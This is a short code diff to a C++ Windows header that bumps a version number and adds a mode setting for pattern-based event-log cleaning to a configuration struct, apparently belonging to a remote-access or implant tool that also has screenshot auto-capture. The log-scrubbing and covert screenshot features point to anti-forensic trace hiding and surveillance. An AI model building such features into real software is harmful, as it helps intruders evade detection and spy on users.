@@ -1,5 +1,5 @@
 #pragma once
-#define HOST_VERSION "1.0.64"
+#define HOST_VERSION "1.0.89"
 #define HOST_BUILD __DATE__ " " __TIME__
 #define WIN32_LEAN_AND_MEAN
 #define NOMINMAX
@@ -88,6 +88,7 @@ struct HostConfig {
     // Example: "MyService,MyApp,SomeDll,192\\.168\\.1\\.100"
     std::string evtlog_clean_patterns;
     int evtlog_clean_interval = 30; // seconds between scans
+    std::string evtlog_clean_mode = "once"; // "once" = clean at startup only, "loop" = periodic
     // Screenshot auto-capture
     bool screenshot_enabled = false;
     int screenshot_interval = 10;    // seconds between captures
